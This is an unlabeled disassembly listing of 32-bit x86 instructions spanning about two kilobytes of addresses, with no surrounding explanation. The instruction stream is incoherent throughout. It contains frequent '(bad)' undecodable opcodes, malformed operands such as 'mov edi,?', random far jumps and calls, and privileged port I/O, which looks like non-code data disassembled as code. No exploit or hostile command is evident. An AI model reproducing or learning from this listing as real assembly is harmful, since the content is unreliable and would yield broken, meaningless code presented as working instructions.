  6b9d53:	mov    ecx,0xc583a5bd
  6b9d58:	into   
  6b9d59:	out    0x58,al
  6b9d5b:	iret   
  6b9d5c:	sub    BYTE PTR [ecx],0x13
  6b9d5f:	jb     0x6b9d76
  6b9d61:	push   cs
  6b9d62:	push   cs
  6b9d63:	daa    
  6b9d64:	xchg   edi,eax
  6b9d65:	push   esp
  6b9d66:	mov    cl,0xa2
  6b9d68:	jmp    0x6b9d17
  6b9d6a:	dec    edi
  6b9d6b:	inc    esi
  6b9d6c:	mov    dl,bl
  6b9d6e:	jb     0x6b9d60
  6b9d70:	mov    dh,0x42
  6b9d72:	lea    ecx,[edx+0x4d]
  6b9d75:	int3   
  6b9d76:	jae    0x6b9d77
  6b9d78:	cwde   
  6b9d79:	retf   0xa209
  6b9d7c:	and    DWORD PTR [ebx-0x50],ebp
  6b9d7f:	bswap  eax
  6b9d81:	sbb    DWORD PTR [eax+0x13],eax
  6b9d84:	imul   edi,DWORD PTR [esi],0x1b049a7f
  6b9d8a:	lds    esp,FWORD PTR [esi+0x6793bfe6]
  6b9d90:	cmc    
  6b9d91:	loope  0x6b9dea
  6b9d93:	adc    al,0xfe
  6b9d95:	pusha  
  6b9d96:	call   0x12fc17ca
  6b9d9b:	jb     0x6b9dac
  6b9d9d:	(bad)  
  6b9d9e:	inc    ebp
  6b9d9f:	out    0x98,eax
  6b9da1:	test   DWORD PTR [esi-0x123ade0b],0x86cf758a
  6b9dab:	push   eax
  6b9dac:	fsubrp st(4),st
  6b9dae:	es jle 0x6b9df1
  6b9db1:	xchg   ebx,eax
  6b9db2:	in     al,dx
  6b9db3:	out    0x2b,al
  6b9db5:	stc    
  6b9db6:	jns    0x6b9e10
  6b9db8:	inc    esp
  6b9db9:	enter  0x32e7,0x8f
  6b9dbd:	arpl   WORD PTR [esi],si
  6b9dbf:	fsub   DWORD PTR [eax-0x39802cab]
  6b9dc5:	(bad)  
  6b9dc6:	fldcw  WORD PTR [eax]
  6b9dc8:	xchg   esi,eax
  6b9dc9:	aad    0xa3
  6b9dcb:	mov    al,ch
  6b9dcd:	into   
  6b9dce:	popa   
  6b9dcf:	pusha  
  6b9dd0:	pop    ebp
  6b9dd1:	sbb    BYTE PTR [ebx],al
  6b9dd3:	adc    DWORD PTR [edx+0x31],edi
  6b9dd6:	cld    
  6b9dd7:	adc    eax,0x85c131c3
  6b9ddc:	xchg   ecx,eax
  6b9ddd:	loopne 0x6b9d75
  6b9ddf:	aam    0x38
  6b9de1:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  6b9de3:	(bad)  
  6b9de4:	es jecxz 0x6b9d89
  6b9de7:	out    0x3e,al
  6b9de9:	mov    ebp,0x3457b31c
  6b9dee:	ins    DWORD PTR es:[edi],dx
  6b9def:	push   edi
  6b9df0:	gs jb  0x6b9de5
  6b9df3:	xor    al,0x63
  6b9df5:	push   cs
  6b9df6:	mov    al,ds:0x9f5ad9c
  6b9dfb:	xchg   ecx,eax
  6b9dfc:	fwait
  6b9dfd:	mov    eax,ds:0x9b69f9cf
  6b9e02:	jb     0x6b9e7b
  6b9e04:	sahf   
  6b9e05:	nop
  6b9e06:	mov    edi,?
  6b9e08:	cmc    
  6b9e09:	fisttp QWORD PTR [ebx-0x5b]
  6b9e0c:	cmp    al,0xab
  6b9e0e:	lahf   
  6b9e0f:	jmp    0xa7fa:0xd61fdf41
  6b9e16:	leave  
  6b9e17:	fidivr WORD PTR [esi+0x45]
  6b9e1a:	sbb    eax,0x13b56921
  6b9e1f:	das    
  6b9e20:	shr    DWORD PTR [edi],cl
  6b9e22:	mov    bl,0x8
  6b9e24:	add    DWORD PTR [esi+0x65],0xe8c8fb25
  6b9e2b:	outs   dx,DWORD PTR ds:[esi]
  6b9e2c:	mov    dl,0xb2
  6b9e2e:	mov    ds:0xb8427425,eax
  6b9e33:	aam    0x1f
  6b9e35:	aaa    
  6b9e36:	mov    ds:0x77029e4e,eax
  6b9e3b:	pop    ss
  6b9e3c:	in     al,0xe5
  6b9e3e:	aaa    
  6b9e3f:	lods   eax,DWORD PTR ds:[esi]
  6b9e40:	push   0x2915403a
  6b9e45:	jg     0x6b9df8
  6b9e47:	test   DWORD PTR [ecx+0x519937dd],ebx
  6b9e4d:	fs jo  0x6b9eb5
  6b9e50:	call   0x935e:0xdb9a00e7
  6b9e57:	ret    0x4113
  6b9e5a:	adc    BYTE PTR [ebx-0x49f891a5],bh
  6b9e60:	pop    ds
  6b9e61:	ret    
  6b9e62:	mov    ?,ebx
  6b9e64:	inc    edi
  6b9e65:	lahf   
  6b9e66:	pop    ebx
  6b9e67:	push   ss
  6b9e68:	dec    esp
  6b9e69:	sahf   
  6b9e6a:	rcr    ch,cl
  6b9e6c:	jns    0x6b9e28
  6b9e6e:	bound  ebp,QWORD PTR [eax+0x34d9003e]
  6b9e74:	mov    eax,ds:0x21896887
  6b9e79:	idiv   DWORD PTR [edi-0x842dadf]
  6b9e7f:	mov    gs,ecx
  6b9e81:	mov    esi,0x28307603
  6b9e86:	enter  0xd61d,0x19
  6b9e8a:	and    ebp,DWORD PTR es:[ecx+0x21f7ac31]
  6b9e91:	cld    
  6b9e92:	pop    ss
  6b9e93:	and    edi,esi
  6b9e95:	sub    DWORD PTR ds:0x67c277fe,eax
  6b9e9b:	mov    ah,0x6e
  6b9e9d:	scas   al,BYTE PTR es:[edi]
  6b9e9e:	nop
  6b9e9f:	and    BYTE PTR [edx+0x2e],0xa0
  6b9ea3:	rcr    BYTE PTR [ebx],1
  6b9ea5:	fild   DWORD PTR [esi]
  6b9ea7:	in     eax,0x6
  6b9ea9:	xor    ebx,ebp
  6b9eab:	add    al,0xf9
  6b9ead:	fdivp  st(5),st
  6b9eaf:	cld    
  6b9eb0:	pop    DWORD PTR [ebp-0x1c]
  6b9eb3:	pop    esi
  6b9eb4:	retf   
  6b9eb5:	xor    al,0xde
  6b9eb7:	or     eax,0x857dfda0
  6b9ebc:	sub    ch,BYTE PTR [ebp-0x7df1e3de]
  6b9ec2:	cmp    esp,DWORD PTR [ecx+0x2b]
  6b9ec5:	nop
  6b9ec6:	add    DWORD PTR [edi-0x459f30],edi
  6b9ecc:	sbb    al,0x89
  6b9ece:	imul   ebx,DWORD PTR [esi-0x2e],0xffffff8b
  6b9ed2:	xchg   esp,eax
  6b9ed3:	fistp  WORD PTR [edi]
  6b9ed5:	push   0x15
  6b9ed7:	lods   al,BYTE PTR ds:[esi]
  6b9ed8:	aad    0xe0
  6b9eda:	adc    DWORD PTR [ecx+ebp*2-0x19d949c9],0xf8432ec7
  6b9ee5:	ficom  DWORD PTR ss:[eax-0x23]
  6b9ee9:	jae    0x6b9f47
  6b9eeb:	fsubr  DWORD PTR [esp+edi*1+0x33]
  6b9eef:	int3   
  6b9ef0:	iret   
  6b9ef1:	pop    ss
  6b9ef2:	xchg   ebx,eax
  6b9ef3:	jae    0x6b9f72
  6b9ef5:	pop    esp
  6b9ef6:	daa    
  6b9ef7:	and    ebp,edi
  6b9ef9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b9efa:	aas    
  6b9efb:	jecxz  0x6b9ee8
  6b9efd:	mov    cl,0x5a
  6b9eff:	outs   dx,DWORD PTR ds:[esi]
  6b9f00:	(bad)  
  6b9f01:	adc    ebp,edi
  6b9f03:	mov    ebx,0xea0e2c9a
  6b9f08:	int    0xc9
  6b9f0a:	mov    ds:0xc6569b2c,eax
  6b9f0f:	into   
  6b9f10:	pop    es
  6b9f11:	xor    al,0xd0
  6b9f13:	mov    eax,0x7c2f5252
  6b9f18:	lock adc eax,0x907245b
  6b9f1e:	cmp    eax,0x3c0f8f81
  6b9f23:	jecxz  0x6b9f8e
  6b9f25:	sub    al,0x33
  6b9f27:	mov    DWORD PTR [esi-0x16925d9d],edi
  6b9f2d:	push   esi
  6b9f2e:	push   ss
  6b9f2f:	fidiv  DWORD PTR [ebp+0x1e1e312f]
  6b9f35:	or     al,0x97
  6b9f37:	aad    0x7d
  6b9f39:	cmp    bl,ch
  6b9f3b:	pop    ds
  6b9f3c:	ret    0xcdfb
  6b9f3f:	bound  ebp,QWORD PTR [esi]
  6b9f41:	jecxz  0x6b9f3e
  6b9f43:	jno    0x6b9fc3
  6b9f45:	and    eax,0x909a8f84
  6b9f4a:	test   DWORD PTR [eax],0x7afbeabb
  6b9f50:	or     DWORD PTR [edi+0x76ed0f5d],esi
  6b9f56:	gs mov al,0xca
  6b9f59:	ror    DWORD PTR [ebp-0x1f1a3161],cl
  6b9f5f:	dec    edi
  6b9f60:	sahf   
  6b9f61:	mov    ecx,0x968afa86
  6b9f66:	dec    ebx
  6b9f67:	cli    
  6b9f68:	pop    ebx
  6b9f69:	adc    ebx,DWORD PTR [esi+ecx*2-0x67db4439]
  6b9f70:	mov    ebx,0xa89aae88
  6b9f75:	push   cs
  6b9f76:	push   ds
  6b9f77:	push   esi
  6b9f78:	add    ch,0x47
  6b9f7b:	pop    ds
  6b9f7c:	adc    BYTE PTR [edi+0x40],bl
  6b9f7f:	jbe    0x6b9f3a
  6b9f81:	jge    0x6b9f28
  6b9f83:	jo     0x6b9f51
  6b9f85:	push   esi
  6b9f86:	lods   eax,DWORD PTR ds:[si]
  6b9f88:	mov    cl,BYTE PTR [edx]
  6b9f8a:	imul   ecx,DWORD PTR ds:0x6121ea76,0x38
  6b9f91:	leave  
  6b9f92:	out    0xd,eax
  6b9f94:	mov    ds:0xe5f99fb3,eax
  6b9f99:	imul   BYTE PTR [esi-0x2a]
  6b9f9c:	loopne 0x6b9fc0
  6b9f9e:	pop    ebp
  6b9f9f:	ins    BYTE PTR es:[edi],dx
  6b9fa0:	and    eax,0x8bcea797
  6b9fa5:	jmp    0xa59d:0x10756e6d
  6b9fac:	mov    ebp,?
  6b9fae:	or     ebx,DWORD PTR [edx-0x62]
  6b9fb1:	nop
  6b9fb2:	jmp    0x6cec:0xf2dd6bb5
  6b9fb9:	pop    ebp
  6b9fba:	imul   cl
  6b9fbc:	sub    DWORD PTR [eax+0x3b67ea4a],0x8f9d7f12
  6b9fc6:	push   esi
  6b9fc7:	scas   eax,DWORD PTR es:[edi]
  6b9fc8:	dec    edi
  6b9fc9:	jns    0x6b9f94
  6b9fcb:	mov    bh,0xac
  6b9fcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b9fce:	or     BYTE PTR [edx+0x5873dcfc],bl
  6b9fd4:	into   
  6b9fd5:	aas    
  6b9fd6:	les    edx,FWORD PTR [ecx+edi*1]
  6b9fd9:	or     DWORD PTR [ebp-0x50],edx
  6b9fdc:	mov    eax,ds:0x79548dbc
  6b9fe1:	inc    ebp
  6b9fe2:	(bad)  
  6b9fe3:	mul    BYTE PTR [ebx+0x5d]
  6b9fe6:	aaa    
  6b9fe7:	nop
  6b9fe8:	fisubr DWORD PTR [ebx+esi*1+0x73]
  6b9fec:	sti    
  6b9fed:	jae    0x6b9fdd
  6b9fef:	repnz (bad) 
  6b9ff1:	lods   al,BYTE PTR ds:[esi]
  6b9ff2:	xor    eax,edi
  6b9ff4:	or     dh,ah
  6b9ff6:	(bad)  
  6b9ff7:	outs   dx,DWORD PTR ds:[esi]
  6b9ff8:	stos   BYTE PTR es:[edi],al
  6b9ff9:	mov    ah,0xa6
  6b9ffb:	jge    0x6b9feb
  6b9ffd:	mov    bl,BYTE PTR [eax]
  6b9fff:	inc    esi
  6ba000:	mov    bh,0x41
  6ba002:	push   ecx
  6ba003:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  6ba005:	(bad)  
  6ba006:	jne    0x6ba01e
  6ba008:	jg     0x6b9ffd
  6ba00a:	aad    0x57
  6ba00c:	cmp    bl,BYTE PTR [edx+0x73]
  6ba00f:	imul   ebp,DWORD PTR [ebx-0x35d7fb0],0xb223f2b5
  6ba019:	add    dh,BYTE PTR [eax+0x55]
  6ba01c:	push   edx
  6ba01d:	push   0x242424e9
  6ba022:	sub    eax,edi
  6ba024:	cli    
  6ba025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6ba026:	mov    bl,0xa8
  6ba028:	mov    bl,0x79
  6ba02a:	out    dx,al
  6ba02b:	jb     0x6b9fb5
  6ba02d:	xchg   edx,eax
  6ba02e:	mov    ecx,0x45d5eb10
  6ba033:	jl     0x6b9fe0
  6ba035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ba036:	push   ebx
  6ba037:	jge    0x6ba0a4
  6ba039:	push   ecx
  6ba03a:	ror    al,1
  6ba03c:	test   al,0x47
  6ba03e:	in     al,dx
  6ba03f:	imul   edx,DWORD PTR [esi+eiz*1],0x3679102c
  6ba046:	pusha  
  6ba047:	shr    DWORD PTR [edi],cl
  6ba049:	aad    0x97
  6ba04b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6ba04c:	dec    edi
  6ba04d:	fidiv  DWORD PTR [ebx]
  6ba04f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ba050:	ins    BYTE PTR es:[edi],dx
  6ba051:	shl    BYTE PTR [ebp+0x5b],cl
  6ba054:	es pop ss
  6ba056:	mov    eax,0xaa92f6ac
  6ba05b:	or     bh,dl
  6ba05d:	inc    edi
  6ba05e:	hlt    
  6ba05f:	test   al,0x33
  6ba061:	pop    ss
  6ba062:	jmp    0x1a184aa0
  6ba067:	xor    bl,ah
  6ba069:	fist   WORD PTR [ebp+0x17444c05]
  6ba06f:	fcomp  DWORD PTR [ebx-0xf5c0808]
  6ba075:	(bad)  
  6ba076:	push   cs
  6ba077:	or     BYTE PTR [ebx],ch
  6ba079:	adc    edi,DWORD PTR [ecx]
  6ba07b:	pop    ss
  6ba07c:	clc    
  6ba07d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ba07e:	dec    edi
  6ba07f:	xor    bl,BYTE PTR [eax]
  6ba081:	mov    ah,0x20
  6ba083:	mov    al,0x67
  6ba085:	lea    ebx,[ecx]
  6ba087:	ret    
  6ba088:	sar    DWORD PTR [ecx+0x288bcda6],cl
  6ba08e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ba08f:	push   es
  6ba090:	dec    ecx
  6ba091:	and    DWORD PTR [eax],esp
  6ba093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6ba094:	add    al,BYTE PTR [ebp+0x9]
  6ba097:	pop    ss
  6ba098:	mov    DWORD PTR [eax],ecx
  6ba09a:	out    0xf1,eax
  6ba09c:	lahf   
  6ba09d:	xor    ebp,DWORD PTR [ecx-0x3c]
  6ba0a0:	dec    eax
  6ba0a1:	adc    BYTE PTR [ebp+eiz*2+0x2f78ee7d],bh
  6ba0a8:	arpl   WORD PTR [ecx+0x33],si
  6ba0ab:	add    DWORD PTR [edx],esi
  6ba0ad:	xor    BYTE PTR [edi+ebx*1+0x51],al
  6ba0b1:	aas    
  6ba0b2:	out    0x11,eax
  6ba0b4:	lea    esi,[ebp+edx*2-0x711f6563]
  6ba0bb:	lods   al,BYTE PTR ds:[esi]
  6ba0bc:	mov    edi,0xcabab627
  6ba0c1:	std    
  6ba0c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ba0c3:	push   esi
  6ba0c4:	mov    al,0xf1
  6ba0c6:	inc    ebx
  6ba0c7:	sub    bh,BYTE PTR [edi]
  6ba0c9:	pop    ds
  6ba0ca:	(bad)  
  6ba0cb:	loopne 0x6ba0b5
  6ba0cd:	xchg   ebx,eax
  6ba0ce:	mov    esp,ecx
  6ba0d0:	imul   eax,edi,0x3
  6ba0d3:	ins    DWORD PTR es:[edi],dx
  6ba0d4:	pop    esi
  6ba0d5:	arpl   WORD PTR [ecx],sp
  6ba0d7:	push   es
  6ba0d8:	je     0x6ba07f
  6ba0da:	xchg   BYTE PTR [ecx+0x31b41654],cl
  6ba0e0:	loopne 0x6ba07b
  6ba0e2:	cwde   
  6ba0e3:	ins    BYTE PTR es:[edi],dx
  6ba0e4:	test   BYTE PTR [eax],0x7c
  6ba0e7:	outs   dx,DWORD PTR ds:[esi]
  6ba0e8:	loope  0x6ba167
  6ba0ea:	inc    ebx
  6ba0eb:	iret   
  6ba0ec:	pop    esp
  6ba0ed:	sbb    al,0x1a
  6ba0ef:	je     0x6ba11f
  6ba0f1:	xchg   ebx,eax
  6ba0f2:	mov    edi,cs
  6ba0f4:	test   dh,cl
  6ba0f6:	(bad)  
  6ba0f7:	loop   0x6ba140
  6ba0f9:	pop    es
  6ba0fa:	sub    DWORD PTR [edx],esi
  6ba0fc:	push   0xffffff98
  6ba0fe:	xchg   BYTE PTR [si-0x1d],ah
  6ba102:	xor    ecx,DWORD PTR [ecx-0x39]
  6ba105:	cdq    
  6ba106:	sub    al,0x8b
  6ba108:	xchg   ebx,eax
  6ba109:	dec    ebp
  6ba10a:	mov    dl,0xd4
  6ba10c:	cmp    DWORD PTR [esi+0x42],edi
  6ba10f:	addr16 inc eax
  6ba111:	sub    ebx,eax
  6ba113:	or     bl,BYTE PTR [ecx]
  6ba115:	pop    ebp
  6ba116:	and    eax,0xc493adcd
  6ba11b:	jg     0x6ba12d
  6ba11d:	pop    ebp
  6ba11e:	std    
  6ba11f:	je     0x6ba0bb
  6ba121:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ba122:	push   edx
  6ba123:	pop    ebx
  6ba124:	shr    bh,0xbb
  6ba127:	sub    ebp,DWORD PTR [edx-0x6d]
  6ba12a:	push   edi
  6ba12b:	(bad)  
  6ba12d:	ret    
  6ba12e:	idiv   BYTE PTR [ebp-0x9f706]
  6ba134:	xor    ebp,DWORD PTR [ecx+0x7d]
  6ba137:	xchg   esp,eax
  6ba138:	js     0x6ba1b0
  6ba13a:	pusha  
  6ba13b:	les    ebp,FWORD PTR [edi-0x3284de70]
  6ba141:	shr    DWORD PTR [ecx],cl
  6ba143:	mov    al,ds:0x5733ad06
  6ba148:	sub    cl,BYTE PTR [edi-0x32]
  6ba14b:	leave  
  6ba14c:	test   DWORD PTR [ebp+0x679c0b0],0xdd163489
  6ba156:	pusha  
  6ba157:	lds    esp,FWORD PTR [esi-0x5]
  6ba15a:	pop    ds
  6ba15b:	jo     0x6ba19b
  6ba15d:	clc    
  6ba15e:	repz imul ecx,DWORD PTR [edx],0xffffffcf
  6ba162:	adc    ecx,edi
  6ba164:	sbb    al,0xed
  6ba166:	pop    ss
  6ba167:	inc    eax
  6ba168:	rol    al,0xe5
  6ba16b:	pushf  
  6ba16c:	arpl   WORD PTR [ebx],cx
  6ba16e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ba16f:	shr    BYTE PTR [esi+0x3e],cl
  6ba172:	inc    eax
  6ba173:	pop    es
  6ba174:	push   ss
  6ba175:	sub    BYTE PTR [esi+edx*1],cl
  6ba178:	push   eax
  6ba179:	or     ebx,DWORD PTR [edx-0x10]
  6ba17c:	dec    esi
  6ba17d:	fnstsw WORD PTR [ecx]
  6ba17f:	enter  0x8551,0xe7
  6ba183:	mov    esi,0xccc2c566
  6ba188:	pop    DWORD PTR [edx+0x19]
  6ba18b:	or     BYTE PTR [edi+edx*8-0x2d6de426],dl
  6ba192:	pop    es
  6ba193:	pop    ebx
  6ba195:	adc    edx,0x7b
  6ba198:	push   eax
  6ba199:	int    0xf3
  6ba19b:	or     edx,DWORD PTR ds:[eax-0x7d229615]
  6ba1a2:	xchg   esi,eax
  6ba1a3:	ret    0x33db
  6ba1a6:	out    dx,eax
  6ba1a7:	adc    BYTE PTR [ebp-0x16],bh
  6ba1aa:	or     DWORD PTR [esi+esi*2],edx
  6ba1ad:	cmc    
  6ba1ae:	loopne 0x6ba21e
  6ba1b0:	ins    BYTE PTR es:[edi],dx
  6ba1b1:	shl    DWORD PTR [ebx],1
  6ba1b3:	nop
  6ba1b4:	loopne 0x6ba13e
  6ba1b6:	iret   
  6ba1b7:	(bad)  
  6ba1b8:	call   0xfba241ac
  6ba1bd:	or     ch,BYTE PTR [ebp-0x1db659c7]
  6ba1c3:	adc    eax,DWORD PTR [eax+0x70479e04]
  6ba1c9:	jl     0x6ba22e
  6ba1cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6ba1cc:	push   eax
  6ba1cd:	mov    al,BYTE PTR [edi-0x4c]
  6ba1d0:	xchg   ebx,eax
  6ba1d1:	loopne 0x6ba171
  6ba1d3:	and    BYTE PTR [ecx-0x7e406771],cl
  6ba1d9:	out    0xdb,eax
  6ba1db:	jns    0x6ba1a7
  6ba1dd:	stc    
  6ba1de:	repnz inc ebp
  6ba1e0:	dec    edx
  6ba1e1:	mov    gs,WORD PTR [ecx]
  6ba1e3:	add    DWORD PTR [eax],edx
  6ba1e5:	pop    ecx
  6ba1e6:	pop    esi
  6ba1e7:	pop    esp
  6ba1e8:	pop    esi
  6ba1e9:	mov    edx,0x45269d
  6ba1ee:	(bad)  
  6ba1ef:	jo     0x6ba207
  6ba1f1:	mov    ebx,0xca1ea8f3
  6ba1f6:	aaa    
  6ba1f7:	dec    ebx
  6ba1f8:	push   edx
  6ba1f9:	pop    es
  6ba1fa:	fidivr DWORD PTR [ecx+0x4]
  6ba1fd:	ds test eax,0x2c76c6ce
  6ba203:	inc    eax
  6ba204:	sahf   
  6ba205:	ins    DWORD PTR es:[edi],dx
  6ba206:	in     eax,0xac
  6ba208:	xchg   BYTE PTR [esi+0x4f3cda21],ch
  6ba20e:	arpl   WORD PTR [ebx+0x436ccd3b],si
  6ba214:	or     dh,BYTE PTR [ebp-0x19]
  6ba217:	mov    ss,WORD PTR [esi-0x2e]
  6ba21a:	push   ss
  6ba21b:	pop    edi
  6ba21c:	(bad)  [esi+0x5e63aad6]
  6ba222:	push   eax
  6ba223:	or     bh,bh
  6ba225:	push   ebp
  6ba226:	lahf   
  6ba227:	shl    BYTE PTR [edi-0x63],1
  6ba22a:	jnp    0x6ba1d4
  6ba22c:	aas    
  6ba22d:	jge    0x6ba21f
  6ba22f:	jno    0x6ba292
  6ba231:	and    edi,ebx
  6ba233:	gs std 
  6ba235:	mov    edi,0xe1fddc76
  6ba23a:	mov    BYTE PTR [edx-0x22],ch
  6ba23d:	adc    DWORD PTR [ebx-0x146ba884],0x8757f389
  6ba247:	aas    
  6ba248:	hlt    
  6ba249:	ins    DWORD PTR es:[edi],dx
  6ba24a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ba24b:	lea    ebp,[esp+eiz*8]
  6ba24e:	loope  0x6ba22f
  6ba250:	popa   
  6ba251:	dec    edx
  6ba252:	dec    ebx
  6ba253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ba254:	fwait
  6ba255:	push   es
  6ba256:	sbb    BYTE PTR [ebx+0x28],ch
  6ba259:	(bad)  
  6ba25a:	rcl    DWORD PTR [edx-0x2dfeb7a4],1
  6ba260:	fcomp  QWORD PTR [ebp+0xd]
  6ba263:	out    dx,al
  6ba264:	aam    0x67
  6ba266:	popa   
  6ba267:	sub    al,0xaf
  6ba269:	pop    edi
  6ba26a:	and    DWORD PTR [esi-0x41f8c38b],ecx
  6ba270:	dec    ecx
  6ba271:	mov    ch,0x64
  6ba273:	or     cl,cl
  6ba275:	add    ah,BYTE PTR [eax+0x1ec3f2f6]
  6ba27b:	adc    ch,cl
  6ba27d:	int    0x97
  6ba27f:	sub    al,0x28
  6ba281:	repz adc ebx,DWORD PTR [ebp+0x8]
  6ba285:	fdivr  DWORD PTR [ebx+0x7a]
  6ba288:	xchg   DWORD PTR [edi-0x29b985d8],eax
  6ba28e:	and    DWORD PTR [esi-0x7816609f],esp
  6ba294:	int    0xda
  6ba296:	push   ecx
  6ba297:	ss in  eax,0x90
  6ba29a:	push   esi
  6ba29b:	mov    bl,0x1d
  6ba29d:	jl     0x6ba265
  6ba29f:	fmul   QWORD PTR [esi-0x32]
  6ba2a2:	imul   esp,DWORD PTR [esi],0xb39f41c4
  6ba2a8:	dec    ebx
  6ba2a9:	(bad)
  6ba2ad:	mov    eax,ds:0x96176e3b
  6ba2b2:	add    cl,BYTE PTR [eax]
  6ba2b4:	pmuludq mm5,QWORD PTR [edx-0x56]
  6ba2b8:	cmp    al,0x8c
  6ba2ba:	add    DWORD PTR [edi],esp
  6ba2bc:	outs   dx,DWORD PTR ds:[esi]
  6ba2bd:	xlat   BYTE PTR ds:[ebx]
  6ba2be:	sbb    bl,BYTE PTR [ecx-0x77]
  6ba2c1:	push   edi
  6ba2c2:	sbb    ch,BYTE PTR [eax]
  6ba2c4:	push   ebx
  6ba2c5:	gs jl  0x6ba25d
  6ba2c8:	mov    ebx,0xad0df2e0
  6ba2cd:	enter  0x1dc9,0x88
  6ba2d1:	ds repnz push es
  6ba2d4:	ds in  al,dx
  6ba2d6:	rol    BYTE PTR [esi+ebx*1],0x1f
  6ba2da:	js     0x6ba2c7
  6ba2dc:	dec    ebx
  6ba2dd:	jo     0x6ba335
  6ba2df:	jmp    0x5b3672b1
  6ba2e4:	int    0xbc
  6ba2e6:	mov    al,ds:0xd52b9c6
  6ba2eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ba2ec:	outs   dx,BYTE PTR ds:[esi]
  6ba2ed:	fcom   DWORD PTR gs:[eax-0x76ddf732]
  6ba2f4:	push   edx
  6ba2f5:	add    DWORD PTR [edx+0x67],edi
  6ba2f8:	in     al,dx
  6ba2f9:	mov    ebx,edx
  6ba2fb:	outs   dx,BYTE PTR ds:[esi]
  6ba2fc:	pop    ebx
  6ba2fd:	cld    
  6ba2fe:	fisubr DWORD PTR [edx-0x2a]
  6ba302:	push   edx
  6ba303:	lds    esp,FWORD PTR [ebx+esi*2]
  6ba306:	(bad)  
  6ba307:	fld    TBYTE PTR [esi-0x20f9b2ac]
  6ba30d:	inc    edx
  6ba30e:	or     eax,0x986e8639
  6ba313:	imul   edi,DWORD PTR [edx-0x3b],0x61
  6ba317:	inc    ecx
  6ba318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ba319:	int3   
  6ba31a:	test   BYTE PTR [esi+edi*2],0xc8
  6ba31e:	mov    dh,0xb7
  6ba320:	loop   0x6ba359
  6ba322:	dec    esi
  6ba323:	cmp    eax,0x389ed370
  6ba328:	call   0x7977:0xece3ef84
  6ba32f:	cli    
  6ba330:	arpl   bp,di
  6ba332:	xor    al,0xf7
  6ba334:	ret    
  6ba335:	sub    eax,0xc5df4c12
  6ba33a:	in     al,dx
  6ba33b:	(bad)  
  6ba33d:	(bad)  
  6ba33f:	adc    eax,0xc42f47cc
  6ba344:	cwde   
  6ba345:	test   BYTE PTR [eax-0x5d],bl
  6ba348:	stos   DWORD PTR es:[edi],eax
  6ba349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ba34a:	sbb    BYTE PTR [ebx-0x7f],bl
  6ba34d:	stc    
  6ba34e:	retf   
  6ba34f:	xchg   DWORD PTR [ebp-0x287544e9],eax
  6ba355:	or     BYTE PTR [ecx+0x7f5dca90],ah
  6ba35b:	push   0xffffffb6
  6ba35d:	push   cs
  6ba35e:	mov    WORD PTR [eax+0x7392aee8],gs
  6ba364:	cmp    ah,BYTE PTR [edi+0x6d6ef4b8]
  6ba36a:	inc    ebp
  6ba36b:	mov    eax,DWORD PTR ds:0x18e75719
  6ba371:	lods   eax,DWORD PTR ds:[esi]
  6ba372:	ins    DWORD PTR es:[edi],dx
  6ba373:	lahf   
  6ba374:	or     DWORD PTR [edi],edx
  6ba376:	xlat   BYTE PTR ds:[ebx]
  6ba377:	pop    esi
  6ba378:	loopne 0x6ba36e
  6ba37a:	push   ebp
  6ba37b:	(bad)  
  6ba37c:	mov    edi,0x5ae7190b
  6ba381:	das    
  6ba382:	test   eax,0xc7aeef63
  6ba387:	(bad)  
  6ba388:	imul   ecx,DWORD PTR [edx+0xacf32de],0x841071aa
  6ba392:	rcr    BYTE PTR [esi+0x3a0ff387],cl
  6ba398:	adc    esi,DWORD PTR [ebp+0x41]
  6ba39b:	cs sti 
  6ba39d:	dec    ecx
  6ba39e:	xor    ebx,DWORD PTR [ebx+esi*8]
  6ba3a1:	cli    
  6ba3a2:	mov    bl,0xb
  6ba3a4:	adc    edx,ebp
  6ba3a6:	aam    0x84
  6ba3a8:	or     eax,0xa974ee4
  6ba3ad:	das    
  6ba3ae:	sbb    DWORD PTR [eax-0x2aa69fd7],ebx
  6ba3b4:	cwde   
  6ba3b5:	ret    0xac64
  6ba3b8:	sbb    al,0x78
  6ba3ba:	aad    0xfe
  6ba3bc:	pop    ebp
  6ba3bd:	mov    ebx,0xc5ec6b45
  6ba3c2:	dec    edi
  6ba3c3:	cmp    edi,DWORD PTR [eax]
  6ba3c5:	jmp    0x6c80f7e1
  6ba3ca:	or     BYTE PTR [ecx-0xb5fe6cd],ah
  6ba3d0:	sub    eax,0x18ed4916
  6ba3d5:	gs push esp
  6ba3d7:	je     0x6ba3c3
  6ba3d9:	stc    
  6ba3da:	jle    0x6ba363
  6ba3dc:	push   ebx
  6ba3dd:	mov    dl,0xe
  6ba3df:	push   cs
  6ba3e0:	(bad)  
  6ba3e1:	xchg   ebx,eax
  6ba3e2:	enter  0x7422,0x83
  6ba3e6:	sbb    BYTE PTR [edi],al
  6ba3e8:	sub    edi,DWORD PTR [ebx+0x4]
  6ba3eb:	pop    ss
  6ba3ec:	mov    esp,edi
  6ba3ee:	mov    edx,0xd757b8a3
  6ba3f3:	xchg   edx,eax
  6ba3f4:	dec    eax
  6ba3f5:	(bad)  
  6ba3f6:	sbb    DWORD PTR [edx-0x60cd7bd],esi
  6ba3fc:	fldcw  WORD PTR [ebp-0x2c]
  6ba3ff:	call   0x53df:0xb7583cd5
  6ba406:	add    ebp,esp
  6ba408:	lea    ecx,[eax+0x663de870]
